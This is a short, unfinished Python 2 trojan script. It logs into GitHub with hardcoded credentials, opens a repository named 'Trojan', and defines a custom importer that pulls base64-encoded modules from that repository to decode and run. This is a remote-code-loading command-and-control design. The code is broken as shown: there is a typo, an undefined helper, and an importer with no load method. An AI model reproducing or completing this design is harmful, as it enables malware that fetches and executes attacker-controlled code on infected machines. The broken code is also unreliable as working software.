import json, base64, sys,time,imp,random,threading,Queue,os

from github3 import login
ID = "sample1"
CONFIG="%s.json" % ID
PATH ="Trojan/data/%s/" % ID
MODULES = []
QUEUE = Queue.Queue()
CONFIGURED = False

class GitImporter(object):
	"""docstring for GitImporter"""
	def __init__(self, arg):
		self.current_module_code = ""

	def find_module(self, fullname,):
		if CONFIGURED:
			print "[*] attempting to find %s"%fullname
			library = get_content("modules/%s" %fullname)
			if library is not None:
				self.current_module_code = base64.b64decode(library)
				return self
		return None


def connect():
	gh = login(username="derp", password="hurp")
	repo = gh.repository("sdmike1","Trojan")
	branch = repo.branch("master")

	return gh, repo, branch

def main():

	gh,repo,branch = connect()
	print gh
	print reop
	print branch

if __name__ == '__main__':
	main()